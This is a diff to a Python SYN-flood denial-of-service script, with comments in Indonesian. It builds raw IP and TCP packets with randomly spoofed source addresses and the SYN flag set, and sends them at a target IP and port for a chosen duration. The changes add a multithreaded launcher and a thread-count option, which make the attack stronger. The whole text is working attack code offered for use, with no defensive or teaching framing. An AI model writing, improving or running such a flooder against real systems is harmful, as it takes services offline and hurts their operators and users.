@@ -3,8 +3,9 @@ import random
 import time
 import argparse
 import struct
-import sys
+import threading
 
+# Fungsi untuk membuat header IP
 def create_ip_header(src_ip, dest_ip):
     ip_ihl = 5
     ip_ver = 4
@@ -31,11 +32,12 @@ def create_ip_header(src_ip, dest_ip):
                             ip_dest)
     return ip_header
 
+# Fungsi untuk membuat header TCP
 def create_tcp_header(src_port, dest_port):
     tcp_seq = 0
     tcp_ack_seq = 0
     tcp_off = 5
-    tcp_flags = 0x02
+    tcp_flags = 0x02  # SYN flag
     tcp_window = socket.htons(5840)
     tcp_check = 0
     tcp_urg_ptr = 0
@@ -52,6 +54,7 @@ def create_tcp_header(src_port, dest_port):
                              tcp_urg_ptr)
     return tcp_header
 
+# Fungsi untuk melakukan SYN Flooding dengan threading
 def syn_flood(target_ip, target_port, duration):
     end_time = time.time() + duration
     while time.time() < end_time:
@@ -59,7 +62,7 @@ def syn_flood(target_ip, target_port, duration):
             src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
             src_port = random.randint(1024, 65535)
 
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
             ip_header = create_ip_header(src_ip, target_ip)
@@ -72,17 +75,25 @@ def syn_flood(target_ip, target_port, duration):
         except Exception as e:
             print(f"Error sending packet: {e}")
 
+# Fungsi untuk menjalankan beberapa thread
+def start_attack(target_ip, target_port, duration, num_threads):
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+
 def parse_args():
     parser = argparse.ArgumentParser(description="Perform SYN Flood on a target IP.")
     parser.add_argument('ip', type=str, help="Target IP address")
     parser.add_argument('port', type=int, help="Target port number")
     parser.add_argument('duration', type=int, help="Duration of the attack in seconds")
+    parser.add_argument('--threads', type=int, default=10, help="Number of threads (default: 10)")
     return parser.parse_args()
 
 if __name__ == "__main__":
-    if len(sys.argv) != 4:
-        print("Usage: python p.py <ip> <port> <duration>")
-        sys.exit(1)
-
     args = parse_args()
-    syn_flood(args.ip, args.port, args.duration)
+    start_attack(args.ip, args.port, args.duration, args.threads)
